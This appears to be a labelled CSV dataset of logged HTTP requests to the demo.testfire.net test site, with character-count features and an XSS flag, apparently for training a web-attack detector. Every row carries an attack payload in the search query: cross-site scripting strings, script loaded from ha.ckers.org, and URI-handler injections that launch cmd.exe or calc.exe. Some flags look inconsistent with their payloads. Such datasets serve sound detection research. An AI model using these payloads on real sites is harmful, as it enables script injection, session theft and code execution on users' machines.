method,path,headers,body,body_length,num_commas,num_hyphens,num_brackets,num_quotes,num_double_quotes,num_slashes,num_braces,num_spaces,has_sql_keywords,has_xss_payload,has_csrf_token,response_status,response_time
GET,http://demo.testfire.net/search.jsp?query=<script>+alert(1)+</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,660
GET,"http://demo.testfire.net/search.jsp?query=aim: &c:\windows\system32\calc.exe"" ini=""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat""","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,618
GET,"http://demo.testfire.net/search.jsp?query=firefoxurl:test|"" -new-window javascript:alert(\'Cross%20Browser%20Scripting!\');""","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,1530
GET,"http://demo.testfire.net/search.jsp?query=navigatorurl:test"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%2c{}%2c0);alert(process)","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,597
GET,http://demo.testfire.net/search.jsp?query=res://c:\\program files\\adobe\\acrobat 7.0\\acrobat\\acrobat.dll/#2/#210,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,593
GET,http://demo.testfire.net/search.jsp?query=<script>alert('xss')</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,289
GET,"http://demo.testfire.net/search.jsp?query=<script>alert(string.fromcharcode(88,83,83))</script>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,289
GET,http://demo.testfire.net/search.jsp?query=</title><script>alert(1)</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,288
GET,http://demo.testfire.net/search.jsp?query='> <script>alert(3)</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,314
GET,http://demo.testfire.net/search.jsp?query=`> <script>alert(5)</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,312
GET,http://demo.testfire.net/search.jsp?query=> <script>alert(4)</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,310
GET,http://demo.testfire.net/search.jsp?query=</title><script>alert(1)</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,303
GET,"http://demo.testfire.net/search.jsp?query=<<script>alert(""xss"");//<</script>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,306
GET,"http://demo.testfire.net/search.jsp?query=>""'","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,302
GET,"http://demo.testfire.net/search.jsp?query='';!--""<XSS>=&{()}","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,295
GET,http://demo.testfire.net/search.jsp?query=*/a=eval;b=alert;a(b(/e/.source));/*,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,297
GET,http://demo.testfire.net/search.jsp?query='%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e',"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,294
GET,http://demo.testfire.net/search.jsp?query=<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,292
GET,http://demo.testfire.net/search.jsp?query=&#39);x=alert;x(&#40 /finally through!/.source &#41);//,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,304
GET,http://demo.testfire.net/search.jsp?query=</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,309
GET,"http://demo.testfire.net/search.jsp?query=<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,307
GET,"http://demo.testfire.net/search.jsp?query=<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""XSS"")>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,309
GET,"http://demo.testfire.net/search.jsp?query=perl -e 'print ""<SCR\0IPT>alert(""XSS"")</SCR\0IPT>"";' > out","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,279
GET,"http://demo.testfire.net/search.jsp?query=<DIV STYLE=""background-image: url(http://ha.ckers.org/xss.js)"">Div Body</DIV> ","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,275
GET,"http://demo.testfire.net/search.jsp?query=<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,275
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,279
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT =""blah"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,324
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT a=""blah"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,328
